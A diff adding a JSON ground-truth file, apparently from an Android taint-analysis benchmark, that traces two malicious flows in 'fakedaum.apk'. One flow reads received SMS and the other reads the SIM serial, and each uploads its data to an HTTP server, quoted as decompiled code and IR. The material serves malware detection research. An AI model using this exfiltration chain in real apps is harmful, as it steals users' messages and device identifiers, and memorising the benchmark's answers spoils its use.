@@ -1,0 +1,251 @@
+{
+  "fileName": "fakedaum.apk",
+  "day": "2019-11-14",
+  "findings": [
+    {
+      "source": {
+        "statement": "message[i] = SmsMessage.createFromPdu((byte[]) objArray[i]);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.mvlove.receiver.SmsReceiver",
+        "lineNo": 44,
+        "targetName": "createFromPdu",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = staticinvoke <android.telephony.SmsMessage: android.telephony.SmsMessage createFromPdu(byte[])>($r16)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "return processResponse(HttpClientManager.getHttpClient().execute(request), clazz);",
+        "methodName": "public T post(HttpPost request, String url, Map<String, String> data, Class<T> clazz)",
+        "className": "com.mvlove.http.HttpWrapper",
+        "lineNo": 667,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r14 = interfaceinvoke $r13.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r7)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "for (SmsMessage currentMessage : message) {",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.mvlove.receiver.SmsReceiver",
+          "lineNo": -1,
+          "ID": 1
+        },
+        {
+          "statement": "address = currentMessage.getDisplayOriginatingAddress();",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.mvlove.receiver.SmsReceiver",
+          "lineNo": 48,
+          "ID": 2
+        },
+        {
+          "statement": "message.setSenderPhone(address);",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.mvlove.receiver.SmsReceiver",
+          "lineNo": 121,
+          "ID": 3
+        },
+        {
+          "statement": "intent2.putExtra(\"data\", message);",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.mvlove.receiver.SmsReceiver",
+          "lineNo": 123,
+          "ID": 4
+        },
+        {
+          "statement": "context.startService(intent2);",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.mvlove.receiver.SmsReceiver",
+          "lineNo": 124,
+          "ID": 5
+        },
+        {
+          "statement": "com.mvlove.entity.Message message = (com.mvlove.entity.Message) intent.getSerializableExtra(\"data\");",
+          "methodName": "public void onStart(Intent intent, int startId)",
+          "className": "com.mvlove.service.TaskService",
+          "lineNo": 92,
+          "ID": 6
+        },
+        {
+          "statement": "this.mPushHandler.sendMessage(this.mPushHandler.obtainMessage(WHAT_PUSH_SMS, message));",
+          "methodName": "public void onStart(Intent intent, int startId)",
+          "className": "com.mvlove.service.TaskService",
+          "lineNo": 95,
+          "ID": 7
+        },
+        {
+          "statement": "pushMessage(this.context, msg.obj);",
+          "methodName": "public void handleMessage(Message msg)",
+          "className": "com.mvlove.service.TaskService.PushSmsHandler",
+          "lineNo": 124,
+          "ID": 8
+        },
+        {
+          "statement": "messages.add(message);",
+          "methodName": "private synchronized void pushMessage(Context context, com.mvlove.entity.Message message)",
+          "className": "com.mvlove.service.TaskService.PushSmsHandler",
+          "lineNo": 141,
+          "ID": 9
+        },
+        {
+          "statement": "ResEntity entity = HttpReqUtil.pushMessage(context, messages, PhoneUtil.getPhone(context), PhoneUtil.getImei(context), PhoneUtil.getModel(), PhoneUtil.getVersion());",
+          "methodName": "private synchronized void pushMessage(Context context, com.mvlove.entity.Message message)",
+          "className": "com.mvlove.service.TaskService.PushSmsHandler",
+          "lineNo": 147,
+          "ID": 10
+        },
+        {
+          "statement": "data.put(\"messageStr\", new Gson().toJson((Object) messages));",
+          "methodName": "public static final ResEntity pushMessage(Context context, List<Message> messages, String phone, String imei, String model, String clientVersion)",
+          "className": "com.mvlove.util.HttpReqUtil",
+          "lineNo": 30,
+          "ID": 11
+        },
+        {
+          "statement": "return (ResEntity) HttpWrapper.getInstance().post(Interface.getPushSmsUrl(), data, ResEntity.class);",
+          "methodName": "public static final ResEntity pushMessage(Context context, List<Message> messages, String phone, String imei, String model, String clientVersion)",
+          "className": "com.mvlove.util.HttpReqUtil",
+          "lineNo": 31,
+          "ID": 12
+        },
+        {
+          "statement": "return post(null, url, data, clazz);",
+          "methodName": "public T post(String url, Map<String, String> data, Class<T> clazz)",
+          "className": "com.mvlove.http.HttpWrapper",
+          "lineNo": 629,
+          "ID": 13
+        },
+        {
+          "statement": "for (Entry<String, String> entry : data.entrySet()) {",
+          "methodName": "public T post(HttpPost request, String url, Map<String, String> data, Class<T> clazz)",
+          "className": "com.mvlove.http.HttpWrapper",
+          "lineNo": -1,
+          "ID": 14
+        },
+        {
+          "statement": "parameters.add(new BasicNameValuePair((String) entry.getKey(), (String) entry.getValue()));",
+          "methodName": "public T post(HttpPost request, String url, Map<String, String> data, Class<T> clazz)",
+          "className": "com.mvlove.http.HttpWrapper",
+          "lineNo": 660,
+          "ID": 15
+        },
+        {
+          "statement": "request.setEntity(new UrlEncodedFormEntity(parameters, \"UTF-8\"));",
+          "methodName": "public T post(HttpPost request, String url, Map<String, String> data, Class<T> clazz)",
+          "className": "com.mvlove.http.HttpWrapper",
+          "lineNo": 665,
+          "ID": 16
+        }
+      ],
+      "attributes": {
+        "array": true,
+        "collections": true,
+        "interComponentCommunication": true,
+        "lifecycle": true,
+        "nonStaticField": true,
+        "pathConstraints": true
+      },
+      "ID": 1,
+      "description": "This malicious flow reads a received SMS and uploads it to an HTTP Server.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "return ((TelephonyManager) context.getSystemService(\"phone\")).getSimSerialNumber();",
+        "methodName": "public static final String getImei(Context context)",
+        "className": "com.mvlove.util.PhoneUtil",
+        "lineNo": 23,
+        "targetName": "getSimSerialNumber",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r3 = virtualinvoke $r2.<android.telephony.TelephonyManager: java.lang.String getSimSerialNumber()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "return processResponse(HttpClientManager.getHttpClient().execute(request), clazz);",
+        "methodName": "public T post(HttpPost request, String url, Map<String, String> data, Class<T> clazz)",
+        "className": "com.mvlove.http.HttpWrapper",
+        "lineNo": 667,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r14 = interfaceinvoke $r13.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r7)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "entity = HttpReqUtil.getMotion(this.context, PhoneUtil.getPhone(this.context), PhoneUtil.getImei(this.context), PhoneUtil.getModel(), PhoneUtil.getVersion(), contacts);",
+          "methodName": "public void run()",
+          "className": "com.mvlove.service.TaskService.LoadMotionThread",
+          "lineNo": 197,
+          "ID": 1
+        },
+        {
+          "statement": "return (ResEntity) HttpWrapper.getInstance().post(Interface.getMotionUrl(), data, ResEntity.class);",
+          "methodName": "public static final ResEntity getMotion(Context context, String phone, String imei, String model, String clientVersion, List<Contact> contacts)",
+          "className": "com.mvlove.util.HttpReqUtil",
+          "lineNo": 45,
+          "ID": 2
+        },
+        {
+          "statement": "data.put(\"imei\", imei);",
+          "methodName": "public static final ResEntity getMotion(Context context, String phone, String imei, String model, String clientVersion, List<Contact> contacts)",
+          "className": "com.mvlove.util.HttpReqUtil",
+          "lineNo": 38,
+          "ID": 3
+        },
+        {
+          "statement": "return post(null, url, data, clazz);",
+          "methodName": "public T post(String url, Map<String, String> data, Class<T> clazz)",
+          "className": "com.mvlove.http.HttpWrapper",
+          "lineNo": 629,
+          "ID": 4
+        },
+        {
+          "statement": "for (Entry<String, String> entry : data.entrySet()) {",
+          "methodName": "public T post(HttpPost request, String url, Map<String, String> data, Class<T> clazz)",
+          "className": "com.mvlove.http.HttpWrapper",
+          "lineNo": -1,
+          "ID": 5
+        },
+        {
+          "statement": "parameters.add(new BasicNameValuePair((String) entry.getKey(), (String) entry.getValue()));",
+          "methodName": "public T post(HttpPost request, String url, Map<String, String> data, Class<T> clazz)",
+          "className": "com.mvlove.http.HttpWrapper",
+          "lineNo": 660,
+          "ID": 6
+        },
+        {
+          "statement": "request.setEntity(new UrlEncodedFormEntity(parameters, \"UTF-8\"));",
+          "methodName": "public T post(HttpPost request, String url, Map<String, String> data, Class<T> clazz)",
+          "className": "com.mvlove.http.HttpWrapper",
+          "lineNo": 665,
+          "ID": 7
+        }
+      ],
+      "attributes": {
+        "collections": true,
+        "nonStaticField": true,
+        "pathConstraints": true,
+        "threading": true
+      },
+      "ID": 2,
+      "description": "This malicious flow reads the IMEI and uploads it to an HTTP Server.",
+      "isNegative": false
+    }
+  ]
+}
